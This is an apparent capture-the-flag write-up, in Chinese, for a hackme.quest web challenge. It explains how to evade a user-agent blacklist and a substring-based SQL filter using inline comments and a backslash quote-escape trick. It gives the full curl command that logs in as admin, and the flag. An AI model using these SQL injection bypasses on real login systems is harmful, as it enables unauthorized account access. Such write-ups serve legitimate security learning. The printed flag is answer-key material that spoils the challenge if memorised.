# PHM #23 Web — login as admin 1

| 項目 | 值 |
|:---|:---|
| 類別 | Web |
| 分數 | 50 |

## 題目

> Login as admin, but this time with WAF.
>
> 連結: [`/login1/`](https://ctf.hackme.quest/login1/)

## 分析

直接 `curl` 會被回「I don't like hackers. :(」 → source 第一段:

```php
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
foreach($bad_ua as $bad) {
    if(strstr($ua, $bad)) die("I don't like hackers. :(");
}
```

UA 黑名單過濾. 加個 `-A "Mozilla/5.0 (X11; Linux x86_64)"` 就過.

接著是 SQLi 過濾:

```php
function safe_filter($str) {
    $strl = strtolower($str);
    if(strstr($strl,' ') || strstr($strl,'1=1') || strstr($strl,"''") ||
       strstr($strl,'union select') || strstr($strl,'select ')) return '';
    return str_replace("'", "\\'", $str);
}
```

黑名單: 空白、`1=1`、`''`、`union select`、`select ` (後面有空白). 用 `/**/` 注入**取代空白**即可 bypass (filter 直接檢查 literal substring, 不會展開 comment).

`str_replace("'", "\\'")` 只跳脫 `'`, 不跳脫 `\` → 同 #21 backslash bypass. 另外 `--` 註解需要空白, 改用 `#`.

## 解法

```bash
UA='Mozilla/5.0 (X11; Linux x86_64)'
curl -A "$UA" https://ctf.hackme.quest/login1/ \
  --data-urlencode 'name=admin\' \
  --data-urlencode 'password=/**/OR/**/isadmin#'
```

同套路: name 的 `\` 吃掉閉引號, password 位置變 `WHERE 'string' /**/OR/**/isadmin #'`, 等於 `WHERE string OR isadmin`, 選到 isadmin=1 的 row.

## Flag

```
FLAG{He110, Admin\\' or 1337 < 314159 #}
```

> [!NOTE]
> flag 內有**兩個** backslash. 送 flag 時注意 escape, 送 `\'` (單 backslash) 會被 reject.

## 感想

典型的 WAF bypass 題:
- UA 黑名單 → 換 UA
- SQL 黑名單用 substring 檢查 → `/**/` 取代空白、`#` 取代 `-- `
- `addslashes` / `str_replace` 不管 backslash → 老技巧

Filter 用 substring match 是最弱的 WAF, 幾乎每種 SQL 語法都能用 inline comment 或大小寫繞過 (本題小寫化, 但 `/**/` 不是關鍵字).
